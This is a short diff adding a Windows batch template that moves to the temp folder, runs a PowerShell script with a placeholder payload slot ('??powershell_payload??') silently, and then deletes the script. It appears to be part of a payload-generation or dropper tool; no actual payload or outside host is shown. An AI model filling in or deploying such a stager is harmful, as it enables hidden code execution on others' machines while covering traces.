@@ -1,0 +1,7 @@
+cd %temp%
+if exist Batched.ps1 del /s /q Batched.ps1 > nul
+
+??powershell_payload??
+
+powershell -file Batched.ps1 > nul
+del /s /q Batched.ps1 > nul
